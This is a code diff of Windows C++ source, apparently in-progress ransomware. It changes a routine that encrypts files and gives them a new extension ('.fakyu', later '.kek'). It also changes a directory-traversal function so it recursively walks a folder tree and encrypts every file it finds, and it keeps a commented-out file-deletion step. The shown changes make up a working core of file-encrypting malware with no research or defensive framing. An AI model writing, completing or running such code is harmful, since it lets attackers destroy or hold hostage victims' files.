@@ -1,15 +1,16 @@
 #include <Windows.h>
 #include <iostream>
-#include <fstream>
 #include "strsafe.h"
-#include <wchar.h>
+#include <string>
 
+int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 
+	WCHAR szOGFileName[MAX_PATH];
+	StringCchCopyW(szOGFileName, MAX_PATH, srcFile);
 
-int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){
-
-
-	WCHAR pzDestFile = wcscat_s(&srcFile,MAX_PATH,L".fakyu");
+	WCHAR* pzDestFile = srcFile;
+	
+	StringCchCatW(pzDestFile, MAX_PATH, L".kek");
 
 	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
 	HANDLE hDestFile = INVALID_HANDLE_VALUE;
@@ -22,7 +23,7 @@ int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){
 	DWORD dwCount = 0;
 
 
-	hSourceFile = CreateFileW(&srcFile, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hSourceFile = CreateFileW(szOGFileName, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hSourceFile != INVALID_HANDLE_VALUE) {
 
 		std::cout << "The sourcefile is open" << std::endl;
@@ -34,7 +35,9 @@ int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){
 
 	}
 
-	hDestFile = CreateFileW(&pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	//wcscat_s(pzDestFile, MAX_PATH, L".kek");
+
+	hDestFile = CreateFileW(pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE != hDestFile) {
 
 		std::cout << "The destfile is open" << std::endl;
@@ -56,7 +59,7 @@ int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){
 
 		}
 
-		std::cout << dwCount << std::endl;
+		//std::cout << dwCount << std::endl;
 		if (dwCount < dwBlockLen) {
 
 			eof = 1;
@@ -79,7 +82,7 @@ int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){
 
 		}
 
-		/*if (DeleteFile(&srcFile) == 0) {
+		/*if (DeleteFile(pzDestFile) == 0) {
 			DWORD d = GetLastError();
 			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
 			break;
@@ -92,9 +95,9 @@ int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){
 	return 0;
 }
 
-bool traverse(LPCWSTR targetDir, int nLevel = 0) {
+bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {
 
-	WIN32_FIND_DATA file_data;
+	WIN32_FIND_DATAW file_data;
 	WCHAR szDir[MAX_PATH];
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 
@@ -121,14 +124,20 @@ bool traverse(LPCWSTR targetDir, int nLevel = 0) {
 
 			if (L'.' != file_data.cFileName[0]) {
 
-				printf("  %ws%ws   <DIR>\n", szOutLine, file_data.cFileName);
+				//printf("  %ws%ws   <DIR>\n", szOutLine, file_data.cFileName);
 				StringCchCopyW(szDir + wcslen(targetDir) + 1, MAX_PATH, file_data.cFileName);
-				traverse(szDir, nLevel + 1);
+				traverse(szDir, clé, nLevel + 1);
 
 			}
 		}
 		else {
-			printf("%ws%ws\n", szOutLine, file_data.cFileName);
+			WCHAR szFullPath[MAX_PATH];
+			StringCchCopyW(szFullPath, MAX_PATH, targetDir);
+			StringCchCatW(szFullPath, MAX_PATH, L"\\");
+			StringCchCatW(szFullPath, MAX_PATH, file_data.cFileName);
+			enkrypt(szFullPath, clé);
+			//enkrypt(file_data.cFileName,clé);
+			//printf("%ws%ws\n", szOutLine, file.data.cFileName);
 		}
 	} while (FindNextFile(hFind, &file_data) != 0);
 
